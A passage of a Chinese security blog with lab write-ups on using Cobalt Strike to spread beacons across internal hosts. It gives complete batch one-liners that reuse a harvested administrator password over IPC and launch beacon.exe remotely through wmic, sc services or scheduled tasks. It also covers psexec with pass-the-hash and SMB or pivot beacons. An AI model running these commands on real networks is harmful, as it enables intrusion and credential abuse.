<li>windows executable首先生成stager，这个stager可能非常小，再去替换模板文件中出现1024个A的地址，这种方式由于stager比较小，而且在模板插入stager之前会写入4个a，因此可以把出现4个a和a出现后的1024字节内出现多个A为特征进行检测</li>
<li>windows executables这种方式不会再去生成stager而是使用其他的方式进行替换，而替换stager的部分模板文件过大，因此会在插入的开始出现4个a但是不会出现多个A。</li>
</ul>
<p><strong>参考文章</strong></p>
<p><a href="https://xz.aliyun.com/t/8103" target="_blank" rel="noopener">从剖析CS木马生成到开发免杀工具</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于内网批量横向渗透的学习总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-08-31 12:07:47" itemprop="dateCreated datePublished" datetime="2020-08-31T12:07:47+08:00">2020-08-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-09-02 20:04:50" itemprop="dateModified" datetime="2020-09-02T20:04:50+08:00">2020-09-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
                    <span itemprop="name">内网渗透</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        之前的学习中我们了解了关于横向移动的方式，当我们知道了这些方式，下一步当然是想要去提高速度，在这篇文章中我将带着大家学习如何来批量上线内网主机。</p>
<h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>192.168.3.* 为仅主机模式的网段</p>
<p>192.168.5.*为nat模式的网段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OWA2013 192.168.3.144 192.168.5.58   边界机</span><br><span class="line">SRV-WEB-KIT 192.168.3.73   内网断网机</span><br><span class="line">PC-JERRY-KIT 192.168.3.75 192.168.5.59   内网出网机</span><br></pre></td></tr></table></figure>

<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><p>​        我们首先学习一下如何使用WMI来批量上线内网主机</p>
<p>​        当我们获取了某个主机的密码，我们想测试是否有内网主机和这个主机的密码相同，首先需要扫描内网那些主机开放了445端口。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831135507642.png" alt="image-20200831135507642"></p>
<p>​        得到这些开放445端口的ip后，我们将这些ip写到一个文件中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell echo 192.168.3.73 &gt;&gt; c:\windows\temp\host.txt</span><br><span class="line">shell echo 192.168.3.75 &gt;&gt; c:\windows\temp\host.txt</span><br></pre></td></tr></table></figure>

<p>​        除了上面这种方式，当然也可以将host.txt在本地写好再上传到边界主机上。</p>
<p>​        当我们得到哪些主机开放了445端口以后，我们想测试我们得到的密码在哪些主机上是相同的,可以使用net use建立ipc连接来进行测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\host.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxxx&quot; &amp;&amp; if %errorlevel% equ 0 ( echo %i &gt;&gt; c:\windows\temp\login_succeed.txt ) &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140152324.png" alt="image-20200831140152324"></p>
<p>​        然后我们准备生成一个shell，再通过wmi来执行达到批量上线的目的。shell生成最好生成pivot listener，因为我们并不能确定内网主机是否能出外网</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140743070.png" alt="image-20200831140743070"></p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140845228.png" alt="image-20200831140845228"></p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140914981.png" alt="image-20200831140914981"></p>
<p>​        生成好以后将生成的beacon.exe上传到边界主机</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831141039574.png" alt="image-20200831141039574"></p>
<p>​        使用wmic执行beacon.exe批量上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxx&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; wmic &#x2F;node:%i &#x2F;user:administrator &#x2F;password:xxx PROCESS call create &quot;\\%i\admin$\temp\beacon.exe&quot; &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831142003540.png" alt="image-20200831142003540"></p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831142030428.png" alt="image-20200831142030428"></p>
<h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>​        在cobaltstrike中，内置了可以通过jump psexec来进行横向渗透的方法，这种方法我们既可以通过建立pivot listener来批量上线，也可以通过使用smb beacon来执行上线。下面我以smb beacon为例来演示下如何通过jump psexec来批量上线内网断网主机。<br>​        要使用smb beacon来上线，首先要创建一个smb类型的listener</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144047330.png" alt="image-20200831144047330"></p>
<p>​        选择target，按住shift选中我们想要上线的几个目标。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144139103.png" alt="image-20200831144139103"></p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144237104.png" alt="image-20200831144237104"></p>
<p>​        选择psexec模块，listener选择我们创建的smb listener</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144319681.png" alt="image-20200831144319681"></p>
<p>​        选择lauch后，CS执行的操作如下</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144519451.png" alt="image-20200831144519451"></p>
<p>​        同时两台内网的主机上线，因为用的是psexec的方式，所以是通过rundll32来执行上线的</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144603432.png" alt="image-20200831144603432"></p>
<p>​        这里对比一下WMI批量上线，我们可以发现使用WMI上线后的权限为当前用户的权限，而使用psexec上线后的权限为system权限。</p>
<p>​        最后我们再测试下使用psexec的这种上线方式能不能通过hash传递来利用，其他的步骤是一样的，只有在传递密码时输入变成了hash</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831145220858.png" alt="image-20200831145220858"></p>
<p>​        CobaltStrike执行的操作如下</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831145543919.png" alt="image-20200831145543919"></p>
<p>​        执行后也可以上线</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831152157468.png" alt="image-20200831152157468"></p>
<p>​        这里有一个小插曲，就是我第一次使用hash传递上线这两台主机时发现只有192.168.3.73这台主机上线，而win10 192.168.3.75没有上线，然后我是用impacket的psexec利用hash传递进行测试，发现无法使用administrator连接，但是我用net use 连接administrator账户又是正常的，经过排错，我发现是因为administrator账户是禁用状态导致的，启用后即可正常执行。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831152344500.png" alt="image-20200831152344500"></p>
<p>​        这里也说明了一个问题，就是即使一个账户是禁用的，在我们知道账号密码的情况下，也是可以通过net use来连接的，但是无法通过pth来连接并且利用。</p>
<h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><p>​        既然要在cobaltstrike通过service来进行批量上线的操作，首先需要生成一个service类型的shell，其次我们需要将这个shell上传到内网主机执行来上线。</p>
<p>​        首先在目标边界主机上创建一个pivot类型的listener</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154146904.png" alt="image-20200831154146904"></p>
<p>​        创建时候注意在host选择边界机内网所对应的ip，这个一定要注意，否则是上线不了断网主机的。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154317379.png" alt="image-20200831154317379"></p>
<p>​        生成一个Stageless，listener选择我们创建的listener，输出类型选择service类型</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154448333.png" alt="image-20200831154448333"></p>
<p>​            将生成的文件上传到边界主机上</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154713116.png" alt="image-20200831154713116"></p>
<p>​        使用sc来批量上线，至于login_success.txt那个文件怎么来的，参考WMI利用的那种方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;Admin123456&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; sc \\%i create xxxxxxxxxxxxxxxxxxxxxxxx binpath&#x3D; &quot;c:\windows\temp\beacon.exe&quot;  &amp;&amp; sc \\%i start xxxxxxxxxxxxxxxxxxxxxxxx &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831155355171.png" alt="image-20200831155355171"></p>
<p>​        使用完以后，记得要将这个服务删除</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;Admin123456&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; sc \\%i delete xxxxxxxxxxxxxxxxxxxxxxxx &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831155845466.png" alt="image-20200831155845466"></p>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>​        我们也可以使用计划任务来批量横向渗透，至于前面生成shell的过程就不演示了，我们这里还是考虑目标主机是断网的一个状态，所以还是要创建一个pivot listener，生成一个Stageless类型的shell，上传到目标边界主机。使用如下命令来创建并执行计划任务上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxxxx&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; schtasks &#x2F;create &#x2F;s %i &#x2F;u &quot;administrator&quot; &#x2F;p &quot;xxxxx&quot; &#x2F;RL HIGHEST &#x2F;F &#x2F;tn &quot;xxxxxxxxxxx&quot; &#x2F;tr &quot;c:\windows\temp\beacon.exe&quot; &#x2F;sc DAILY &#x2F;mo 1 &#x2F;ST 11:06 &amp;&amp; schtasks &#x2F;run &#x2F;tn xxxxxxxxxxx &#x2F;s %i &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxxx&quot; &amp;&amp; schtasks &#x2F;query &#x2F;s %i &#x2F;U &quot;administrator&quot; &#x2F;P &quot;xxxxx&quot; | findstr &quot;xxxxxxxxxxx&quot; &amp;&amp; schtasks &#x2F;delete &#x2F;F &#x2F;tn xxxxxxxxxxx &#x2F;s %i &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxxx&quot; &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831165538229.png" alt="image-20200831165538229"></p>
<p>​        <strong>使用计划任务有一个限制，就是我们启动计划任务的用户必须是在线的状态，如果是注销状态或者其他没有登录的状态，则无法正常上线。</strong></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过上面的学习总结，我们发现仅仅依托cobaltstrike再加上几条命令，即可完成批量上线内网断网主机的目的，需要注意的是使用service来批量横向生成的shell类型要使用service类型，计划任务上线需要目标用户处于登录状态。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于内网断网主机上线的学习总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-08-28 17:12:06" itemprop="dateCreated datePublished" datetime="2020-08-28T17:12:06+08:00">2020-08-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-09-02 20:04:20" itemprop="dateModified" datetime="2020-09-02T20:04:20+08:00">2020-09-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
                    <span itemprop="name">内网渗透</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        在进行内网横向移动的过程中我们可能经常会遇到这样的情况，目标内网中的其他主机不出外网，那么我们使用cs直接生成的reverse shell就没有办法使目标内网中的”断网”主机上线，今天我就和大家一起学习如何上线内网的”断网”主机。</p>
<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OWA2013:192.168.3.144 192.168.5.55   模拟边界机192.168.5.*这个网段使用nat模式，192.168.3.*使用仅主机模式</span><br><span class="line">ser-web:192.168.3.73 模拟内网断网机</span><br></pre></td></tr></table></figure>

<h3 id="Pivot-listener"><a href="#Pivot-listener" class="headerlink" title="Pivot listener"></a>Pivot listener</h3><p><strong>建立Pivot listener</strong></p>
<p>​        首先让边界主机OWA2013上线,上线后对着边界机右键，选择pivoting-&gt;Listener</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828180723949.png" alt="image-20200828180723949"></p>
<p>​        配置过程中需要注意，这里的<strong>Listen host要选择和内网主机所在一个段所对应的ip</strong>，我这里是192.168.3.144</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828180840537.png" alt="image-20200828180840537"></p>
<p>​        <img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181006859.png" alt="image-20200828181006859"></p>
<p>​            Pivot listener生成好以后，选择Packages-&gt;windows executalbe(s)</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181100073.png" alt="image-20200828181100073"></p>
<p>​        配置过程中Listener选择我们刚生成的Pivot listener</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181152418.png" alt="image-20200828181152418"></p>
<p>​        假设我们这里已经拿到了内网断网主机的密码，使用ipc进行连接。</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181857058.png" alt="image-20200828181857058"></p>
<p>​        在文件管理这里将生成的文件上传到断网主机</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828182328347.png" alt="image-20200828182328347"></p>
<p>​        使用remote exec wmi模块去执行上传的exe</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828182839924.png" alt="image-20200828182839924"></p>
<p>​        目标主机上线，这里有一个小点需要注意，就是上线的这台断网机只要我们不进行交互默认的last时间就是一直增长的，这里不需要管这个超时时间的问题，需要的时候执行命令就可以了</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828182918650.png" alt="image-20200828182918650"></p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828183126947.png" alt="image-20200828183126947"></p>
<h3 id="smb-beacon"><a href="#smb-beacon" class="headerlink" title="smb beacon"></a>smb beacon</h3><p><strong>什么是smb beacon？</strong></p>
<p>​        SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。 因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效(系统防火墙默认是允许445的端口与外界通信的，其他端口可能会弹窗提醒，会导致远程命令行反弹shell失败)。</p>
<p><strong>什么是命名管道？</strong></p>
<p>​        “命名管道” 又名 “命名管线”，但是通常都叫命名管道，是一种简单基于 SMB 协议的进程间通信（Internet Process Connection - IPC）机制。 在计算机编程里，命名管道可在同一台计算机的不同进程之间或在<strong>跨越一个网络的不同计算机的不同进程之间</strong>，支持可靠的、单向或双向的数据通信传输。和一般的管道不同，命名管道可以被不同进程以不同的方式方法调用（可以跨语言、跨平台）。只要程序知道命名管道的名字，任何进程都可以通过该名字打开管道的另一端，根据给定的权限和服务器进程通信。</p>
<p><strong>命名规范</strong><br>命名管道的命名是采用的 UNC 格式：\Server\Pipe[Path]Name 的。</p>
<p>第一部分\Server指定了服务器的名字，命名管道服务即在此服务器创建，其字符串部分可表示为一个小数点(表示本机)、星号(当前网络字段)、域名或是一个真正的服务；第二部分 pipe 是一个不可变化的硬编码字串，以指出该文件是从属于 NTFS；第三部分[Path]Name则使应用程序可以唯一定义及标识一个命名管道的名字，而且可以设置多级目录。</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831103821108.png" alt="image-20200831103821108"></p>
<p><strong>利用条件</strong></p>
<ul>
<li>目标开放445端口</li>
<li>得知目标主机账号密码并建立ipc连接</li>
</ul>
<p><strong>如何使用smb beacon</strong></p>
<p>​        首先我们创建一个smb的listener</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831101527143.png" alt="image-20200831101527143"></p>
<p>​        我们再通过ipc和内网的断网主机192.168.3.73建立连接</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831101635873.png" alt="image-20200831101635873"></p>
<p>​        建立连接后通过jump命令来让192.168.3.73这台断网主机上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jump psexec 192.168.3.73 smb</span><br></pre></td></tr></table></figure>

